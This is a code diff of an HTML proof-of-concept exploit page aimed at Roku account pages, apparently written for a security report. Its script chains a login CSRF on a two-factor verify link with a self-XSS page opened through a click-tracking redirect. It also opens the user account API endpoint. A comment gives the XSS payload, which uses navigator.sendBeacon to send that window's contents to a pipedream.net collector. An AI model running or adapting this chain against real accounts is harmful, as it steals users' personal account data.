@@ -8,18 +8,22 @@
 <body>
     <script>
         
-        setTimeout(() => {
-        target= window.open("http//my.roku.com/account/api/v2/user/account",'target') //SENSTIVE USER INFO 
+    
+        target= window.open("https://my.roku.com/account/api/v2/user/account",'target') //SENSTIVE USER INFO 
 
-        }, 5000);
+        
         // triger the Login CSRF from 2fa request
         setTimeout(() => {
-        window.open("//my.roku.com/verify/dzVg2arvgYZaJ0VIniWRBtjkTk8ZPdx2jV0GF5FuNibJ%2BdCLraeM4%2BaHWoYiG5MOkxfKhWLFH%2FgVWo52K%2FW2fQ%3D%3D")
+            window.open("https://my.roku.com/verify/dzVg2arvgYZaJ0VIniWRBtjkTk8ZPdx2jV0GF5FuNibJ%2BdCLraeM4%2BaHWoYiG5MOkxfKhWLFH%2FgVWo52K%2FW2fQ%3D%3D")
 
         }, 5000);
         
-        //Open Self XSS Page format: https://website.com
-        window.open("https://click.web.roku.com/CL0/https:%2F%2Fmy.roku.com%2Fverify-email%2Fverify%2FphotoStreams%2F9e7dfb1c7ab33da80483ae5ad4aa6ef7ae2c6ef432ff2adbd79aedca5e059b49931f026ac8c011dcca8c558c87dd0e74dc704923ca90127e2ea4bb92daa5f7372e1c9ab8f2d2b34f52411d0144cbd736222c98b8f1401c2a3fecf85a0471ed81efec0e7c5141d9ae610de211f4c5dbc19454f41af50dc1f1fd8250d28d093c0855300adb0baca68802376f0971b93d32d592f47e8d2d5788d4f9968f41947ecb8dca12d415b7e3f1835968fc6a21a8ea/1/0100019a5522e34e-c6f32c20-d63b-4b8e-8022-99a81eabc950-000000/1SUmaP4UpiBYTVUC5tzw6SeQFb3bEymFG_EMiJ3pxKI=430")
+
+        setTimeout(() => {
+            //Open Self XSS Page format: https://website.com
+            window.open("https://click.web.roku.com/CL0/https:%2F%2Fmy.roku.com%2Fverify-email%2Fverify%2FphotoStreams%2F9e7dfb1c7ab33da80483ae5ad4aa6ef7ae2c6ef432ff2adbd79aedca5e059b49931f026ac8c011dcca8c558c87dd0e74dc704923ca90127e2ea4bb92daa5f7372e1c9ab8f2d2b34f52411d0144cbd736222c98b8f1401c2a3fecf85a0471ed81efec0e7c5141d9ae610de211f4c5dbc19454f41af50dc1f1fd8250d28d093c0855300adb0baca68802376f0971b93d32d592f47e8d2d5788d4f9968f41947ecb8dca12d415b7e3f1835968fc6a21a8ea/1/0100019a5522e34e-c6f32c20-d63b-4b8e-8022-99a81eabc950-000000/1SUmaP4UpiBYTVUC5tzw6SeQFb3bEymFG_EMiJ3pxKI=430")
+        }, 10000);
+    
 
         //In the xss payload:
         // javascript:navigator.sendBeacon("//eodyrh169lq66mf.m.pipedream.net",target.document.body.innerHTML)
